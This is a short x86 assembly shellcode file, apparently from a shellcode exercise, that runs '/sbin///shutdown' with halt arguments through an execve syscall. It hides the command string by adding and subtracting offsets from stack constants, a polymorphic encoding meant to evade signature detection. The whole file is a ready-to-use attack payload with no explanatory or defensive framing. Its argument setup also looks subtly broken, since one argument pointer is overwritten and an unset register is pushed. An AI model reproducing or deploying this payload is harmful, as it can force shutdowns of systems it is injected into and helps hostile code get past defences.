; Polymorphic version of shutdown code
; Author Ian McLachlan


section .text

    global _start

_start:

        mov eax, 0x0
        mov edx, 0x0
        push 0x0
        push 0x2d
        push 0x68
        mov edi, esp
        push 0x0
        push byte 0x6e
        mov WORD [esp+0x1], 0x776f
        mov edi, esp
        push 0x0
        push 0x4c554d42
        pop ebx
        add ebx, 0x22222222
        push ebx
        push 0x85867984
        pop ebx
        sub ebx, 0x11111111
        push ebx
        push 0x11111111
        pop ebx
        add ebx, 0x1e1e1e5d
        push ebx
        push 0x6962732f
        mov ebx, esp
        push edx
        push esi
        push edi
        push ebx
        mov ecx, esp
        mov al, 11
        int 0x80

